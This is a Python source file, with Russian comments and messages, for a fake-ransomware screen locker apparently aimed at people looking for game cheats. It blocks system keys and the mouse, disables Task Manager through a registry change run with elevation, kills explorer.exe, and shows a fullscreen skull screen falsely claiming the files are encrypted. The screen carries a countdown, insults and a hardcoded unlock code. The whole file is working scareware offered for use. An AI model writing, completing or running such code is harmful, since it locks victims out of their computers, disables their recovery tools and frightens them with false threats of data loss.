import tkinter as tk
from tkinter import messagebox
import pygame
import time
import threading
import math
import keyboard
import pynput
import os
import subprocess
import sys



#блокирую клавиши и мышку
block_key = ('win', 'esc', 'tab', 'shift', 'ctrl', 'del', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12')
keyboard.block_key(block_key)

#блокировка мыши
mouse_listener = pynput.mouse.Listener(suppress=True)
mouse_listener.start()
#Всё вернестя после выключения кода

#Убиваем процессы

def run_as_admin(bat_file):
    try:
        subprocess.run(['powershell', 'Start-Process', bat_file, '-Verb', 'RunAs'])
    except Exception as e:
        print(f"Ошибка: {e}")

run_as_admin("reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System' /v DisableTaskMgr /t REG_DWORD /d 1 /f")


os.system("taskkill /f /im explorer.exe")




class FullScreenPasswordLock:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("СИСТЕМА ЗАРАЖЕНА")

        # Инициализация pygame для музыки
        try:
            pygame.mixer.init(frequency=22050, size=-16, channels=2, buffer=512)
            self.music_available = True
        except:
            self.music_available = False
            print("Музыка недоступна")

        # Блокируем стандартные способы закрытия
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)
        self.root.bind('<Escape>', self.prevent_close)
        self.root.bind('<Alt-F4>', self.prevent_close)
        self.root.bind('<Control-w>', self.prevent_close)
        self.root.bind('<Control-q>', self.prevent_close)
        self.root.bind('<Alt-Tab>', self.prevent_close)
        self.root.bind('<Super_L>', self.prevent_close)
        self.root.bind('<Super_R>', self.prevent_close)

        # Полноэкранный режим
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='#1a0000')

        # Делаем окно поверх всех остальных
        self.root.attributes('-topmost', True)

        self.correct_password = "8263"
        self.attempts = 0
        self.max_attempts = 5
        self.locked = False
        self.music_playing = False
        self.timer_expired = False
        self.alarm_music_playing = False

        self.create_interface()

        # Запуск музыки
        self.play_alarm_music()

    def prevent_close(self, event=None):
        """Предотвращает закрытие окна"""
        return "break"

    def create_interface(self):
        # Основной контейнер
        main_frame = tk.Frame(self.root, bg='#1a0000')
        main_frame.pack(expand=True, fill='both', padx=50, pady=50)

        # Череп ASCII арт
        skull_art = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣏⢻⣿⣿⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣦⠻⣿⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿⣿⣿⠋⣼⣿⣿
⣿⣿⣿⣿⣦⠙⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⣿⠟⢡⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣄⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟⢁⣴⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⢛⣷⣄⡈⢙⡻⠿⡟⠉⣂⣴⡛⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿⣿⣿⣿
⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿
⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
        """

        skull_label = tk.Label(
            main_frame,
            text=skull_art,
            fg='#ff0000',
            bg='#1a0000',
            font=('Courier New', 12, 'bold'),
            justify='center'
        )
        skull_label.pack(pady=10)

        # Заголовок
        title_label = tk.Label(
            main_frame,
            text=" СИСТЕМА ЗАРАЖЕНА ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ ",
            fg='#ff0000',
            bg='#1a0000',
            font=('Arial', 26, 'bold'),
            justify='center'
        )
        title_label.pack(pady=10)

        # Предупреждающее сообщение
        warning_text = """
╔══════════════════════════════════════════════════════════════╗
║                КРИТИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ                    ║
╠══════════════════════════════════════════════════════════════╣
║  Обнаружен: Тупой школьник который хотел читики              ║
║  Все файлы зашифрованы. Доступ ограничен.                    ║
║  Для восстановления напишите в дс: ???? .                    ║
║  Время ограничено! Таймер: 15 минут!                         ║
╚══════════════════════════════════════════════════════════════╝
        """

        warning_label = tk.Label(
            main_frame,
            text=warning_text,
            fg='#ff4444',
            bg='#1a0000',
            font=('Courier New', 10, 'bold'),
            justify='center'
        )
        warning_label.pack(pady=20)

        # Фрейм для ввода пароля
        self.password_frame = tk.Frame(main_frame, bg='#1a0000')
        self.password_frame.pack(pady=30)

        tk.Label(
            self.password_frame,
            text="ВВЕДИТЕ КОД РАЗБЛОКИРОВКИ:",
            fg='#ff6666',
            bg='#1a0000',
            font=('Arial', 12, 'bold')
        ).pack(pady=5)

        self.password_entry = tk.Entry(
            self.password_frame,
            show='•',
            font=('Arial', 18, 'bold'),
            width=15,
            justify='center',
            bg='#330000',
            fg='#ff0000',
            insertbackground='red',
            relief='solid',
            bd=3
        )
        self.password_entry.pack(pady=10)
        self.password_entry.bind('<Return>', self.check_password)
        self.password_entry.focus()

        # Кнопка проверки пароля (будет удалена по таймеру)
        self.submit_btn = tk.Button(
            self.password_frame,
            text=" РАЗБЛОКИРОВАТЬ СИСТЕМУ ",
            command=self.check_password,
            bg='#990000',
            fg='white',
            font=('Arial', 12, 'bold'),
            padx=30,
            pady=15,
            relief='raised',
            bd=5,
            activebackground='#cc0000',
            activeforeground='white'
        )
        self.submit_btn.pack(pady=15)

        # Счетчик попыток
        self.attempts_label = tk.Label(
            main_frame,
            text=f" ПОПЫТОК: {self.attempts}/{self.max_attempts}",
            fg='#ffaa00',
            bg='#1a0000',
            font=('Arial', 11, 'bold')
        )
        self.attempts_label.pack(pady=10)

        # Таймер обратного отсчета (15 минут)
        self.timer_label = tk.Label(
            main_frame,
            text=" ДО УНИЧТОЖЕНИЯ ДАННЫХ: 15:00",
            fg='#ff0000',
            bg='#1a0000',
            font=('Arial', 14, 'bold')
        )
        self.timer_label.pack(pady=5)

        # Статус системы
        self.status_label = tk.Label(
            main_frame,
            text="СИСТЕМНЫЕ КОМБИНАЦИИ БЛОКИРОВАНЫ ВИНДА УДАЛИТСЯ ЕСЛИ ЗАЙТИ В БЕЗОПАСЫНЙ РЕЖИМ",
            fg='#00ff00',
            bg='#1a0000',
            font=('Arial', 10, 'bold')
        )
        self.status_label.pack(pady=5)

        # Критическое предупреждение
        critical_warning = tk.Label(
            main_frame,
            text=" ВНИМАНИЕ: 5 НЕУДАЧНЫХ ПОПЫТОК ИЛИ ИСТЕЧЕНИЕ ВРЕМЕНИ ПРИВЕДУТ К БЛОКИРОВКЕ!",
            fg='#ff0000',
            bg='#1a0000',
            font=('Arial', 10, 'bold')
        )
        critical_warning.pack(side='bottom', pady=20)

        # Запускаем таймер
        self.start_timer()

    def start_timer(self):
        """Запускает обратный отсчет 15 минут"""
        self.time_left = 900  # 15 минут в секундах
        self.update_timer()

    def update_timer(self):
        """Обновляет таймер"""
        if self.time_left > 0:
            minutes = self.time_left // 60
            seconds = self.time_left % 60
            self.timer_label.config(text=f" ДО УНИЧТОЖЕНИЯ ДАННЫХ: {minutes:02d}:{seconds:02d}")
            self.time_left -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.timer_expired = True
            self.timer_label.config(text=" ВРЕМЯ ВЫШЛО! СИСТЕМА ЗАБЛОКИРОВАНА!")
            self.remove_unlock_button()

    def remove_unlock_button(self):
        """Удаляет кнопку разблокировки после таймера"""
        if hasattr(self, 'submit_btn') and self.submit_btn:
            self.submit_btn.pack_forget()  # Убираем кнопку
            self.password_entry.config(state='disabled', bg='#550000')  # Отключаем поле ввода
            self.status_label.config(text=" ВРЕМЯ ВЫШЛО! СИСТЕМА ЗАБЛОКИРОВАНА НАВСЕГДА!", fg='#ff0000')

            # Запускаем тревожные аккорды
            self.start_alarm_chords()

            # Показываем сообщение о блокировке по таймеру
            messagebox.showerror(
                "ВРЕМЯ ВЫШЛО!",
                " ТАЙМЕР ИСТЕК!\n\n"
                "Система заблокирована навсегда!\n"
                "Возможность разблокировки утрачена!\n\n"
                "Пизда твоему компу, щенок"
            )

    def generate_chord(self, frequencies, duration=1.0):
        """Генерирует аккорд из нескольких частот"""
        sample_rate = 22050
        n_samples = int(duration * sample_rate)
        samples = bytearray()

        for i in range(n_samples):
            sample = 0
            for freq in frequencies:
                sample += 0.2 * math.sin(2 * math.pi * freq * i / sample_rate)
            samples.append(int(sample * 127 + 128))

        return pygame.mixer.Sound(buffer=bytes(samples))

    def start_alarm_chords(self):
        """Запускает тревожные аккорды после блокировки"""
        if not self.alarm_music_playing and self.music_available:
            self.alarm_music_playing = True

            def play_chords():
                print("🎵 АККОРДЫ: Играют тревожные аккорды...")

                # Тревожные аккорды
                chords = [
                    [330, 392, 494],  # Минорный аккорд
                    [349, 440, 523],  # Еще один минор
                    [311, 370, 466],  # Пониженные частоты
                    [392, 494, 587]  # Повышенные частоты
                ]

                while self.alarm_music_playing:
                    for chord in chords:
                        if not self.alarm_music_playing:
                            break
                        try:
                            chord_sound = self.generate_chord(chord, 1.5)
                            chord_sound.play()
                            time.sleep(0.5)  # Пауза между аккордами
                        except Exception as e:
                            print(f"Ошибка воспроизведения аккорда: {e}")
                            break

            chord_thread = threading.Thread(target=play_chords)
            chord_thread.daemon = True
            chord_thread.start()
            print("🎵 Запущены тревожные аккорды!")

    def generate_beep_sound(self, frequency=440, duration=1000, volume=0.5):
        """Генерирует простой звуковой сигнал"""
        sample_rate = 22050
        n_samples = int(sample_rate * duration / 1000.0)
        buf = bytearray()

        for i in range(n_samples):
            sample = volume * math.sin(2 * math.pi * frequency * i / sample_rate)
            buf.extend([int(sample * 127 + 128)])

        return bytes(buf)

    def play_alarm_music(self):
        """Воспроизводит тревожную музыку с начала запуска"""

        def music_loop():
            try:
                while self.music_playing and self.music_available:
                    # Чередуем разные частоты для тревожного эффекта
                    frequencies = [330, 392, 262, 294, 349, 440]  # Тревожные аккорды
                    for freq in frequencies:
                        if not self.music_playing:
                            break
                        # Создаем звук
                        sound_data = self.generate_beep_sound(freq, 400, 0.4)
                        sound = pygame.mixer.Sound(buffer=sound_data)
                        sound.play()
                        # Ждем окончания звука
                        time.sleep(0.5)
            except Exception as e:
                print(f"Ошибка воспроизведения: {e}")

        if self.music_available and not self.music_playing:
            self.music_playing = True
            music_thread = threading.Thread(target=music_loop)
            music_thread.daemon = True
            music_thread.start()

    def lock_system(self):
        """Блокирует систему после превышения лимита попыток"""
        if not self.locked:
            self.locked = True

            # Отключаем поле ввода и кнопку
            self.password_entry.config(state='disabled', bg='#550000')
            self.submit_btn.config(state='disabled', bg='#550000')
            self.status_label.config(text=" СИСТЕМА ЗАБЛОКИРОВАНА - ПРЕВЫШЕН ЛИМИТ ПОПЫТОК!", fg='#ff0000')

            # Останавливаем обычную музыку
            self.music_playing = False

            # Запускаем тревожные аккорды
            self.start_alarm_chords()

            # Показываем сообщение о блокировке
            messagebox.showerror(
                "СИСТЕМА ЗАБЛОКИРОВАНА",
                " ПРЕВЫШЕН ЛИМИТ ПОПЫТОК!\n\n"
                "Система заблокирована навсегда!\n"
                "Активирован протокол уничтожения данных...\n\n"
                "Запущены тревожные аккорды!"
            )

    def check_password(self, event=None):
        """Проверяет введенный пароль"""
        if self.locked or self.timer_expired:
            return

        entered_password = self.password_entry.get()

        if entered_password == self.correct_password:

            # Останавливаем всю музыку
            self.music_playing = False
            self.alarm_music_playing = False
            if self.music_available:
                pygame.mixer.stop()
            messagebox.showinfo(
                "СИСТЕМА ВОССТАНОВЛЕНА",
                " Код принят! Система разблокирована.\n\n"
                "Ваш компьютер в полной безопасности.\n"
                "Нажмите Enter для разблокировки"
            )
            os.system('start explorer.exe')
            self.root.quit()
            return

        # Неправильный пароль
        self.attempts += 1
        self.attempts_label.config(text=f"♻️ ПОПЫТОК: {self.attempts}/{self.max_attempts}")

        if self.attempts >= self.max_attempts:
            self.lock_system()
        else:
            messagebox.showerror(
                "НЕВЕРНЫЙ КОД",
                f" КОД ОТКЛОНЕН!\n\n"
                f"Осталось попыток: {self.max_attempts - self.attempts}\n\n"
                f""
            )

        self.password_entry.delete(0, tk.END)
        self.password_entry.focus()

    def run(self):
        """Запускает приложение"""
        try:
            self.root.mainloop()
        except KeyboardInterrupt:
            print("\nПрограмма прервана пользователем")
            self.music_playing = False
            self.alarm_music_playing = False
            if self.music_available:
                pygame.mixer.stop()
        except Exception as e:
            print(f"Ошибка: {e}")
        finally:
            self.music_playing = False
            self.alarm_music_playing = False
            try:
                pygame.mixer.quit()
            except:
                pass
            self.root.destroy()


def main():
    # Консольное предупреждение
    print("ПИЗДА ТВОЕМУ КОМПУ ")


    # Запуск приложения
    app = FullScreenPasswordLock()
    app.run()


if __name__ == "__main__":
    main()